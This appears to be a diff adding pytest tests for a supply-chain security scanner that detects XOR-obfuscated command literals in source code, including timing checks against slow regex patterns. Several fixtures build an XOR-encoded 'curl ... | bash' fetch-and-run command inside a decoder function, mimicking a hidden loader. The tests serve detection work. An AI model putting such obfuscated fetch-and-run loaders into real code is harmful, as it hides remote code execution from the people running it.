@@ -2322,6 +2322,72 @@ class TestSupplyChainSafePatterns:
             for finding in findings
         )
 
+    @pytest.mark.parametrize("quote", ["'", '"'])
+    def test_unterminated_xor_key_backslashes_do_not_block_decoding(self, quote: str) -> None:
+        import time
+
+        # Large enough to expose the old exponential pattern, but finite if it
+        # regresses so the assertion can fail instead of hanging the test suite.
+        content = "def broken(values):\n    key = b" + quote + "\\" * 38
+        started = time.monotonic()
+        assert sc_mod._decoded_literal_xor_calls(content) == []
+        assert time.monotonic() - started < 1
+
+    @pytest.mark.parametrize(
+        ("literal", "key"),
+        [
+            (r"b'\\'", b"\\"),
+            (r"b'\''", b"'"),
+            (r'b"\""', b'"'),
+            (r"b'a\\'", b"a\\"),
+            (r"b'\x9c'", b"\x9c"),
+            (r"b'a\\\'\x9c'", b"a\\'\x9c"),
+        ],
+    )
+    def test_xor_decoder_preserves_escaped_literal_keys(self, literal: str, key: bytes) -> None:
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ key[index % len(key)] for index, value in enumerate(command.encode())]
+        content = (
+            "def decode(values):\n"
+            f"    key = {literal}\n"
+            "    return bytes(value ^ key[index % len(key)] "
+            "for index, value in enumerate(values)).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(4, command)]
+
+    def test_unclosed_xor_function_headers_do_not_rescan_the_suffix(self) -> None:
+        import time
+
+        content = "def a(\n" * (256_000 // 7)
+        started = time.monotonic()
+        assert sc_mod._decoded_literal_xor_calls(content) == []
+        assert time.monotonic() - started < 1
+
+    def test_xor_decoder_preserves_multiline_function_header(self) -> None:
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ ord("a") for value in command.encode()]
+        content = (
+            "def decode(\n    values,\n):\n"
+            "    key = b'a'\n"
+            "    return bytes(value ^ key[0] for value in values).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(6, command)]
+
+    def test_xor_decoder_preserves_continued_literal_key(self) -> None:
+        key = b"a    b"
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ key[index % len(key)] for index, value in enumerate(command.encode())]
+        content = (
+            "def decode(values):\n"
+            "    key = b'a" + "\\\n" + "    b'\n"
+            "    return bytes(value ^ key[index % len(key)] "
+            "for index, value in enumerate(values)).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(5, command)]
+
     def test_sc2_xor_decoded_command_survives_unicode_line_separators(self) -> None:
         # The "\u2028" escapes below are actual U+2028 LINE SEPARATOR characters at
         # runtime. They make the decoder's logical line numbers exceed an LF-only
